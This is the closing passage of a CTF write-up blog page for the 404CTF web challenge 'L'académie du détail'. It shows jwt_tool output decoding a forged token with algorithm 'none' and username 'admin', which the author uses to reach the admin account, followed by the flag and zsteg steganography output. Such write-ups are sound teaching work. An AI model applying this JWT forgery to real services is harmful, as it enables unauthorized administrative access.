</span></span><span style=display:flex><span>         |   |   <span style=color:#ae81ff>\ </span>   |      |          |       <span style=color:#ae81ff>\ </span>        <span style=color:#ae81ff>\ </span>    |
</span></span><span style=display:flex><span>         |        <span style=color:#ae81ff>\ </span>  |      |          |    __  <span style=color:#ae81ff>\ </span>    __  <span style=color:#ae81ff>\ </span>   |
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>\ </span>     |      _     |      |          |   |     |   |     |   |
</span></span><span style=display:flex><span>   |     |     / <span style=color:#ae81ff>\ </span>   |      |          |   |     |   |     |   |
</span></span><span style=display:flex><span><span style=color:#ae81ff>\ </span>       |    /   <span style=color:#ae81ff>\ </span>  |      |          |<span style=color:#ae81ff>\ </span>       |<span style=color:#ae81ff>\ </span>       |   |
</span></span><span style=display:flex><span> <span style=color:#ae81ff>\_</span>_____/ <span style=color:#ae81ff>\_</span>_/     <span style=color:#ae81ff>\_</span>_|   <span style=color:#ae81ff>\_</span>_|      <span style=color:#ae81ff>\_</span>_| <span style=color:#ae81ff>\_</span>_____/  <span style=color:#ae81ff>\_</span>_____/ <span style=color:#ae81ff>\_</span>_|
</span></span><span style=display:flex><span> Version 2.2.6                <span style=color:#ae81ff>\_</span>_____|             @ticarpi      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Original JWT: 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>=====================</span>
</span></span><span style=display:flex><span>Decoded Token Values:
</span></span><span style=display:flex><span><span style=color:#f92672>=====================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Token header values:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> alg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;none&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> typ <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;JWT&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Token payload values:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> exp <span style=color:#f92672>=</span> 1683937854    <span style=color:#f92672>==</span>&gt; TIMESTAMP <span style=color:#f92672>=</span> 2023-05-13 02:30:54 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>----------------------
</span></span><span style=display:flex><span>JWT common timestamps:
</span></span><span style=display:flex><span>iat <span style=color:#f92672>=</span> IssuedAt
</span></span><span style=display:flex><span>exp <span style=color:#f92672>=</span> Expires
</span></span><span style=display:flex><span>nbf <span style=color:#f92672>=</span> NotBefore
</span></span><span style=display:flex><span>----------------------
</span></span><span style=display:flex><span> 
</span></span></code></pre></div><p>All I have to do now is modify my token with the tampered JWT to access the admin account :
<img loading=lazy src=/assets/images/writeups/404_academie3.png#center alt=academie3></p><p>Flag: <code>404CTF{JWT_M41_1MP13M3N73_=L35_Pr0813M35}</code></p><p><strong>Bonus :</strong>
At the start of the CTF, once authenticated with the admin account, there was a steganography step which was later removed as it didn&rsquo;t add anything to the challenge.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>zsteg marguerite.png
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>b1,r,lsb,xy         .. text: <span style=color:#e6db74>&#34;C1y]E\\E{&#34;</span>
</span></span><span style=display:flex><span>b1,rgb,lsb,xy       .. text: <span style=color:#e6db74>&#34;404CTF{JWT_M41_1MP13M3N73_=L35_Pr0813M35}&#34;</span>
</span></span><span style=display:flex><span>b1,bgr,lsb,xy       .. file: OpenPGP Secret Key
</span></span><span style=display:flex><span>b2,r,msb,xy         .. text: <span style=color:#e6db74>&#34;TD@TTADDD&#34;</span>
</span></span><span style=display:flex><span>b2,g,msb,xy         .. text: <span style=color:#e6db74>&#34;TD@TTADDD&#34;</span>
</span></span><span style=display:flex><span>b2,b,msb,xy         .. text: <span style=color:#e6db74>&#34;TD@TTADDD&#34;</span>
</span></span><span style=display:flex><span>b4,r,msb,xy         .. text: <span style=color:#e6db74>&#34;pb 7drB%R&#34;</span>
</span></span><span style=display:flex><span>b4,g,lsb,xy         .. file: MacBinary, Mon Feb  <span style=color:#ae81ff>6</span> 07:28:16 <span style=color:#ae81ff>2040</span> INVALID date, modified Mon Feb  <span style=color:#ae81ff>6</span> 07:28:16 2040, creator <span style=color:#e6db74>&#39;    &#39;</span> <span style=color:#e6db74>&#34;\340\020\020\020\020\001\021\020&#34;</span>
</span></span><span style=display:flex><span>b4,g,msb,xy         .. text: <span style=color:#e6db74>&#34;pb 7drB%R&#34;</span>
</span></span><span style=display:flex><span>b4,b,msb,xy         .. text: <span style=color:#e6db74>&#34;pb 7drB%R&#34;</span>
</span></span><span style=display:flex><span>b4,bgr,lsb,xy       .. file: <span style=color:#ae81ff>0420</span> Alliant virtual executable not stripped
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://sanlokii.eu/tags/web/>Web</a></li><li><a href=https://sanlokii.eu/tags/write-up/>Write-Up</a></li></ul><nav class=paginav><a class=prev href=https://sanlokii.eu/writeups/404ctf/fuite-en-1791/><span class=title>« Prev</span><br><span>404CTF : Fuite en 1791</span>
</a><a class=next href=https://sanlokii.eu/writeups/404ctf/la-vie-francaise/><span class=title>Next »</span><br><span>404CTF : La vie française</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share 404CTF : L'académie du détail on x" href="https://x.com/intent/tweet/?text=404CTF%20%3a%20L%27acad%c3%a9mie%20du%20d%c3%a9tail&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2f404ctf%2facademie-du-detail%2f&amp;hashtags=Web%2cWrite-up"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share 404CTF : L'académie du détail on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsanlokii.eu%2fwriteups%2f404ctf%2facademie-du-detail%2f&amp;title=404CTF%20%3a%20L%27acad%c3%a9mie%20du%20d%c3%a9tail&amp;summary=404CTF%20%3a%20L%27acad%c3%a9mie%20du%20d%c3%a9tail&amp;source=https%3a%2f%2fsanlokii.eu%2fwriteups%2f404ctf%2facademie-du-detail%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://sanlokii.eu/>Sanlokii</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>